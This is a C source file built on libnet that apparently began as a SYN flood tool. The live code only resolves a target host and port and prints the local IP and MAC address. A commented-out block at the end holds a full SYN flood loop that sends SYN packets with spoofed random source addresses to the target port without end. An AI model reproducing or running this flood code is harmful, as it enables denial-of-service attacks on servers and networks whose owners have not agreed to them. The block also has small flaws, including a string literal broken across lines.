#include <libnet.h>

#define FLOOD_DELAY 5000 // Delay between packet injects by 5000 ms.

/* Returns an IP in x.x.x.x notation */
char *print_ip(u_long *ip_addr_ptr)
{
    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

int main(int argc, char *argv[])
{
    //IPs
    u_long dest_ip, mi_ip;
    u_short dest_port;
    //MAC en formato string
    char *mac_addr_str = "08:00:27:0e:34:8d";
    //MAC Address
    struct libnet_ether_addr *mi_mac_addr;

    u_int8_t *ip_addr_p, *mac_addr;

    //Buffer para guardar los errores
    u_char errbuf[LIBNET_ERRBUF_SIZE];
    //Contexto
    libnet_t *l;

    if (argc < 3)
    {
        printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
        exit(1);
    }

    //Crea un contexto de libnet
    l = libnet_init(LIBNET_RAW4, NULL, errbuf);
    if (l == NULL)
    {
        fprintf(stderr, "libnet_init() failed: %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    //Obtiene mi IP
    mi_ip = libnet_get_ipaddr4(l);
    if (mi_ip != -1)
        printf("My IP address: %s\n", libnet_addr2name4(mi_ip, LIBNET_DONT_RESOLVE));
    else
        fprintf(stderr, "Couldn't get own IP address: %s\n", libnet_geterror(l));

    //Obtiene mi MAC
    mi_mac_addr = libnet_get_hwaddr(l);
    if (mi_mac_addr != NULL)
        printf("My MAC address: %02X:%02X:%02X:%02X:%02X:%02X\n",
               mi_mac_addr->ether_addr_octet[0],
               mi_mac_addr->ether_addr_octet[1],
               mi_mac_addr->ether_addr_octet[2],
               mi_mac_addr->ether_addr_octet[3],
               mi_mac_addr->ether_addr_octet[4],
               mi_mac_addr->ether_addr_octet[5]);
    else
        fprintf(stderr, "Couldn't get own MAC address: %s\n", libnet_geterror(l));

    //Obtiene la direccion IP destino
    dest_ip = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE); // The host
    ip_addr_p = (u_int8_t *)(&dest_ip);
    printf("Destination Address: %d.%d.%d.%d\n", ip_addr_p[0],
           ip_addr_p[1], ip_addr_p[2], ip_addr_p[3]);

    //y el puerto
    dest_port = (u_short)atoi(argv[2]); // The port

    int length;
    mac_addr = libnet_hex_aton(mac_addr_str, &length);

    if (mac_addr != NULL)
    {
        printf("Address read: ");
        for (int i = 0; i < length; i++)
        {
            printf("%02X", mac_addr[i]);
            if (i < length - 1)
                printf(":");
        }
        printf("\n");

        // Remember to free the memory allocated by libnet_hex_aton()
        free(mac_addr);
    }

    libnet_destroy(l);

    return 0;

    /*
    u_char *packet;
    int opt, network, byte_count;

    int packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    network = libnet_open_raw_sock(IPPROTO_RAW); // Open network interface.
    if (network == -1)
        libnet_error(LIBNET_ERR_FATAL, "can't open network interface. -- this program must run as root.\n");

    libnet_init_packet(packet_size, &packet); // Allocate memory for packet.
    if (packet == NULL)
        libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

    libnet_seed_prand(); // Seed the random number generator.
    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));

    while (1) // loop forever (until break by CTRL-C)
    {
        libnet_build_ip(LIBNET_TCP_H,                    // Size of the packet sans IP header.
                        IPTOS_LOWDELAY,                  // IP tos
                        libnet_get_prand(LIBNET_PRu16),  // IP ID (randomized)
                        0,                               // Frag stuff
                        libnet_get_prand(LIBNET_PR8),    // TTL (randomized)
                        IPPROTO_TCP,                     // Transport protocol
                        libnet_get_prand(LIBNET_PRu32),  // Source IP (randomized)
                        dest_ip,                         // Destination IP
                        NULL,                            // Payload (none)
                        0,                               // Payload length
                        packet);                         // Packet header memory
        libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)
                         dest_port,                      // Destination TCP port
                         libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)
                         libnet_get_prand(LIBNET_PRu32), // Acknowledgement number (randomized)
                         TH_SYN,                         // Control flags (SYN flag set only)
                         libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
                         0,                              // Urgent pointer
                         NULL,                           // Payload (none)
                         0,                              // Payload length
                         packet + LIBNET_IP_H);          // Packet header memory
        if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
            libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

        byte_count = libnet_write_ip(network, packet, packet_size); // Inject packet.
        if (byte_count < packet_size)
            libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written. (%d of %d
                         bytes) ", byte_count, packet_size);
                usleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.
    }

    libnet_destroy_packet(&packet);           // Free packet memory.
    if (libnet_close_raw_sock(network) == -1) // Close the network interface.
        libnet_error(LIBNET_ERR_WARNING, "can't close network interface.");

    */
}